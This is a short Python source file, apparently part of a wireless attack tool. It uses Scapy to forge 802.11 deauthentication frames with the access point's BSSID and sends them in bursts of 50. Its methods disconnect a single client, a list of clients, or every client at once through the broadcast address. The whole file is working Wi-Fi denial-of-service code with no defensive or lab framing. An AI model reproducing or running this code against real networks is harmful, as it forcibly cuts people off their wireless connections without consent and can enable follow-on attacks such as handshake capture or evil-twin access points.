import asyncio

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, sendp


class DeauthPackets():
    def __init__(self, bssid : str, device : str):
        self.bssid = bssid
        self.device = device

    async def kill_one_user(self, client_mac : str) -> bool:
        packet = RadioTap() / Dot11(addr1=client_mac, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
        await asyncio.to_thread(sendp, packet, iface=self.device, count=50, inter=0.1, verbose=False)
        return True
    
    async def kill_many_users(self, clients_mac : list) -> bool:
        for client_mac in clients_mac:
            await self.kill_one_user(client_mac)
        return True

    async def kill_all_users(self) -> bool:
        return await self.kill_one_user('ff:ff:ff:ff:ff:ff')
